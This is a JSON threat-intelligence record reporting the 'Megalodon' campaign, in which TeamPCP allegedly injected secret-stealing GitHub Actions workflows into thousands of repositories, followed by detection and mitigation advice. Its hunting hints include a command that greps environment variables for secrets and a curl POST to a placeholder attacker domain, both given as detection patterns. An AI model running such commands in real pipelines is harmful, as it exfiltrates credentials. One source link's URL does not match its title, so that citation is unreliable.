@@ -1,0 +1,190 @@
+{
+  "id": "061043d1-451b-456c-affa-9538cd5e6aac",
+  "slug": "megalodon-supply-chain-attack-hits-over-5500-github-repositories",
+  "headline": "Megalodon Attack: 5,561 GitHub Repos Compromised in Automated CI/CD Onslaught",
+  "title": "TeamPCP's 'Megalodon' Campaign Injects Malicious CI/CD Workflows into Thousands of GitHub Projects",
+  "summary": "A massive, automated supply chain attack dubbed \"Megalodon\" has compromised 5,561 public GitHub repositories. The threat actor, TeamPCP, leveraged compromised developer credentials to inject malicious CI/CD workflows, aiming to exfiltrate secrets. The campaign, executed in just six hours, shows a dual motivation of financial gain and geopolitical disruption, with wiper malware deployed against targets in Iran and Israel, demonstrating the sophisticated and scalable nature of modern software supply chain threats.",
+  "full_report": "## Executive Summary\nWithin a six-hour window on May 18, 2026, the threat actor **TeamPCP** executed a large-scale, automated supply chain attack codenamed \"Megalodon.\" The campaign successfully compromised 5,561 public **[GitHub](https://github.com)** repositories by injecting malicious CI/CD workflows. The primary objective was the exfiltration of sensitive secrets and credentials from affected software projects. The attack leveraged compromised developer credentials, likely obtained through infostealer malware. Evidence of destructive wiper malware deployed against targets in Iran and Israel suggests a complex motivation combining financial gain with geopolitical objectives. This incident highlights the critical vulnerability of CI/CD pipelines and the increasing automation used by threat actors to execute attacks at scale.\n\n---\n\n## Threat Overview\nThe Megalodon campaign represents a sophisticated evolution in supply chain attacks. The threat actor, **TeamPCP**, known for both financially and geopolitically motivated operations, orchestrated the attack with precision and speed. The initial access vector was the compromise of developer GitHub accounts, with analysis indicating a strong correlation to infostealer malware logs. Once access was gained, the attackers pushed 5,718 malicious commits across the 5,561 repositories.\n\nTo obscure their actions, the attackers used throwaway GitHub accounts with forged author identities, such as `build-bot` and `ci-bot`. The core of the attack was the modification of CI/CD workflow files (e.g., within the `.github/workflows/` directory) to include steps that exfiltrated environment variables, secrets, and other credentials to a remote command-and-control (C2) server. The campaign's impact was widespread, affecting open-source projects, cloud infrastructure tools, developer utilities, and cryptocurrency platforms.\n\n---\n\n## Technical Analysis\nThe attack chain demonstrates a clear understanding of modern software development practices and their inherent weaknesses.\n\n1.  **Initial Access**: The campaign began with the compromise of developer accounts. Evidence suggests this was achieved through infostealer malware campaigns targeting developers' machines. This aligns with the MITRE ATT&CK technique [`T1555 - Credentials from Password Stores`](https://attack.mitre.org/techniques/T1555/).\n\n2.  **Execution & Persistence**: Using the compromised credentials ([`T1078 - Valid Accounts`](https://attack.mitre.org/techniques/T1078/)), **TeamPCP** automated the process of pushing malicious commits. They modified CI/CD pipeline configurations, a technique known as [`T1137.004 - CI/CD Pipeline Modification`](https://attack.mitre.org/techniques/T1137/004/). This modification acted as a persistence mechanism, ensuring the malicious code would execute whenever the CI/CD pipeline was triggered (e.g., on a new push or pull request).\n\n3.  **Exfiltration**: The malicious workflows were designed to capture sensitive data. This included API keys, tokens, and other secrets stored in the CI/CD environment. The data was then exfiltrated to an attacker-controlled C2 server, consistent with [`T1537 - Transfer Data to Cloud Account`](https://attack.mitre.org/techniques/T1537/).\n\n4.  **Impact**: Beyond data theft, the campaign included a destructive component. In targeted attacks against entities in Iran and Israel, the attackers deployed wiper malware. This use of [`T1485 - Data Destruction`](https://attack.mitre.org/techniques/T1485/) indicates a dual purpose, aiming to cause disruption and damage in addition to espionage or financial gain.\n\n---\n\n## Impact Assessment\nThe Megalodon campaign has significant and far-reaching implications. For the 5,561 affected projects, the immediate impact is the potential theft of critical secrets, which could lead to further compromise of production systems, cloud infrastructure, and user data. The reputational damage to these projects, many of which are open-source and rely on community trust, is substantial. The attack's broad targeting across sectors like cloud infrastructure and cryptocurrency means that the stolen credentials could be used to attack a wide array of downstream services and organizations. The geopolitical dimension, with destructive attacks on Iranian and Israeli targets, elevates this from a standard cybercrime event to a hybrid operation with potential nation-state involvement or alignment.\n\n---\n\n## IOCs — Directly from Articles\nNo specific file hashes, IP addresses, or domains were mentioned in the source articles.\n\n---\n\n## Cyber Observables — Hunting Hints\nSecurity teams may want to hunt for the following patterns to identify similar CI/CD compromises:\n\n| Type | Value | Description |\n|---|---|---|\n| `command_line_pattern` | `env \\| grep -E \"(SECRET|TOKEN|KEY|PASSWORD)\"` | Suspicious command in CI/CD logs attempting to list environment variables containing secrets. |\n| `command_line_pattern` | `curl -X POST -d @- <attacker-domain>` | Common pattern for exfiltrating data captured from previous pipeline steps to an external server. |\n| `user_account_pattern` | `build-bot` or `ci-bot` | Look for commits from generic or suspicious author names not aligned with known team members or official bots. |\n| `file_path` | `.github/workflows/*.yml` | Monitor for unexpected or unauthorized modifications to GitHub Actions workflow files. |\n| `network_traffic_pattern` | Outbound connections from CI/CD runners to non-standard or uncategorized domains. | CI/CD runners should typically only connect to known package registries, APIs, and cloud provider endpoints. |\n\n---\n\n## Detection & Response\nDetection of this activity requires a defense-in-depth approach focused on the software development lifecycle.\n\n1.  **Log Analysis**: Regularly audit **[GitHub](https://github.com)** audit logs for suspicious sign-ins, particularly from unusual locations or IP addresses. Analyze CI/CD execution logs for anomalous commands, network connections, or script executions. D3FEND's [`D3-NTA: Network Traffic Analysis`](https://d3fend.mitre.org/technique/d3f:NetworkTrafficAnalysis) is critical here.\n\n2.  **Commit Monitoring**: Implement automated scanning of all incoming commits and pull requests to look for suspicious changes, especially in CI/CD configuration files. Check for commits from new or unverified authors.\n\n3.  **Secret Scanning**: Use tools to scan code repositories and CI/CD logs for inadvertently exposed secrets. This can provide an early warning that credentials have been compromised or are at risk.\n\n4.  **Endpoint Detection**: Since the initial vector was likely infostealers, a robust EDR solution on developer workstations is crucial for detecting the malware that steals credentials in the first place. This aligns with [`D3-PA: Process Analysis`](https://d3fend.mitre.org/technique/d3f:ProcessAnalysis).\n\n---\n\n## Mitigation\nOrganizations should implement the following controls to defend against such supply chain attacks:\n\n1.  **Enforce Multi-Factor Authentication (MFA)**: Mandate MFA for all developer accounts on platforms like **[GitHub](https://github.com)**. This is the single most effective control against credential compromise. See [`M1032 - Multi-factor Authentication`](https://attack.mitre.org/mitigations/M1032/).\n\n2.  **Implement Principle of Least Privilege**: CI/CD jobs should only have access to the secrets they absolutely require to function. Avoid using long-lived, overly permissive tokens. Use short-lived credentials where possible.\n\n3.  **Require Signed Commits**: Enforce policies that require developers to sign their commits with GPG keys. This makes it much harder for an attacker with stolen credentials to impersonate a developer. This relates to [`M1045 - Code Signing`](https://attack.mitre.org/mitigations/M1045/).\n\n4.  **Harden CI/CD Pipelines**: Implement branch protection rules to require reviews for any changes to workflow files. Use third-party GitHub Apps that can scan and validate CI/CD workflows for malicious patterns before they are run. This is a form of D3FEND's [`D3-ACH: Application Configuration Hardening`](https://d3fend.mitre.org/technique/d3f:ApplicationConfigurationHardening).",
+  "twitter_post": "⚠️ Massive 'Megalodon' supply chain attack hits 5,561 GitHub repos! Threat actor TeamPCP injected malicious CI/CD workflows to steal secrets, with destructive wiper attacks in Iran & Israel. #SupplyChain #GitHub #CyberAttack",
+  "meta_description": "A sophisticated supply chain attack named 'Megalodon' by threat actor TeamPCP has compromised over 5,500 GitHub repositories by injecting malicious CI/CD workflows to exfiltrate secrets and deploy wipers.",
+  "category": [
+    "Supply Chain Attack",
+    "Cyberattack",
+    "Threat Actor"
+  ],
+  "severity": "critical",
+  "entities": [
+    {
+      "name": "TeamPCP",
+      "type": "threat_actor"
+    },
+    {
+      "name": "GitHub",
+      "type": "product",
+      "url": "https://github.com/"
+    }
+  ],
+  "cves": [],
+  "sources": [
+    {
+      "url": "https://www.securityweek.com/docketwise-data-breach-impacts-143000/",
+      "title": "Over 5,500 GitHub Repositories Infected in ‘Megalodon’ Supply Chain Attack",
+      "date": "2026-05-25",
+      "friendly_name": "SecurityWeek",
+      "website": "securityweek.com"
+    },
+    {
+      "url": "https://www.rescana.ai/blog/megalodon-supply-chain-attack-teamtcp-compromised-5561-github-repositories",
+      "title": "Megalodon Supply Chain Attack: TeamPCP Compromises 5,561 GitHub Repositories via Malicious CI/CD Workflows",
+      "date": "2026-05-24",
+      "friendly_name": "Rescana",
+      "website": "rescana.ai"
+    }
+  ],
+  "events": [
+    {
+      "datetime": "2026-05-18T00:00:00Z",
+      "summary": "The Megalodon attack campaign was executed within a six-hour window, compromising 5,561 GitHub repositories."
+    }
+  ],
+  "mitre_techniques": [
+    {
+      "id": "T1137.004",
+      "name": "CI/CD Pipeline Modification",
+      "tactic": "Persistence"
+    },
+    {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Defense Evasion"
+    },
+    {
+      "id": "T1555",
+      "name": "Credentials from Password Stores",
+      "tactic": "Credential Access"
+    },
+    {
+      "id": "T1537",
+      "name": "Transfer Data to Cloud Account",
+      "tactic": "Exfiltration"
+    },
+    {
+      "id": "T1485",
+      "name": "Data Destruction",
+      "tactic": "Impact"
+    }
+  ],
+  "mitre_mitigations": [
+    {
+      "id": "M1032",
+      "name": "Multi-factor Authentication",
+      "description": "Enforcing MFA on developer accounts prevents attackers from using stolen credentials to access GitHub.",
+      "domain": "enterprise"
+    },
+    {
+      "id": "M1026",
+      "name": "Privileged Account Management",
+      "description": "Applying the principle of least privilege to CI/CD pipelines ensures that even if compromised, the blast radius is limited.",
+      "domain": "enterprise"
+    },
+    {
+      "id": "M1045",
+      "name": "Code Signing",
+      "description": "Requiring signed commits makes it significantly harder for an attacker to impersonate a legitimate developer.",
+      "domain": "enterprise"
+    },
+    {
+      "id": "M1047",
+      "name": "Audit",
+      "description": "Regularly auditing GitHub and CI/CD logs for suspicious activity can help detect compromises early.",
+      "domain": "enterprise"
+    },
+    {
+      "id": "M1054",
+      "name": "Software Configuration",
+      "description": "Hardening CI/CD configurations, such as using branch protection rules for workflow files, can prevent unauthorized modifications.",
+      "domain": "enterprise"
+    }
+  ],
+  "d3fend_countermeasures": [],
+  "iocs": [],
+  "cyber_observables": [
+    {
+      "type": "command_line_pattern",
+      "value": "env | grep -E \"(SECRET|TOKEN|KEY|PASSWORD)\"",
+      "description": "A suspicious command that may be used in a malicious CI/CD workflow to discover and list sensitive environment variables.",
+      "context": "CI/CD execution logs",
+      "confidence": "high"
+    },
+    {
+      "type": "user_account_pattern",
+      "value": "build-bot",
+      "description": "Forged author identity used by TeamPCP to push malicious commits, attempting to blend in with legitimate automation.",
+      "context": "Git commit logs, GitHub audit logs",
+      "confidence": "high"
+    },
+    {
+      "type": "file_path",
+      "value": ".github/workflows/",
+      "description": "The directory for GitHub Actions workflows. Unauthorized or suspicious modifications to YAML files in this path are a key indicator of compromise.",
+      "context": "File integrity monitoring, code repository scanning",
+      "confidence": "high"
+    },
+    {
+      "type": "network_traffic_pattern",
+      "value": "Outbound HTTP/S POST requests from CI/CD runners to unknown domains",
+      "description": "Malicious workflows often exfiltrate stolen secrets by sending them to an attacker-controlled C2 server via HTTP POST requests.",
+      "context": "Egress firewall logs, network traffic analysis",
+      "confidence": "medium"
+    }
+  ],
+  "tags": [
+    "Megalodon",
+    "TeamPCP",
+    "CI/CD",
+    "GitHub Actions",
+    "Wiper",
+    "Infostealer"
+  ],
+  "extract_datetime": "2026-05-25T15:00:00.000Z",
+  "impact_scope": {
+    "geographic_scope": "global",
+    "countries_affected": [
+      "Iran",
+      "Israel"
+    ],
+    "industries_affected": [
+      "Technology",
+      "Finance",
+      "Other"
+    ],
+    "other_affected": [
+      "open-source software projects",
+      "cloud infrastructure users",
+      "cryptocurrency projects"
+    ]
+  },
+  "pub_date": "2026-05-25",
+  "reading_time_minutes": 6,
+  "createdAt": "2026-05-25T15:00:00.000Z",
+  "updatedAt": "2026-05-27T12:00:00Z",
+  "updates": [
+    {
+      "update_id": "update-1",
+      "update_date": "2026-05-27T12:00:00Z",
+      "datetime": "2026-05-27T12:00:00Z",
+      "title": "Update 1",
+      "summary": "New details reveal the Megalodon attack leveraged fake pull requests to inject malicious GitHub Actions workflows, compromising over 5,500 repositories.",
+      "sources": [
+        {
+          "title": "The Week in Breach News: May 20, 2026",
+          "url": "https://www.kaseya.com/resources/the-week-in-breach-news-may-20-2026/"
+        },
+        {
+          "title": "Supply Chain Attacks: April–May 2026 Timeline",
+          "url": "https://www.boostsecurity.io/blog/supply-chain-attacks-april-may-2026-timeline"
+        }
+      ]
+    }
+  ]
+}
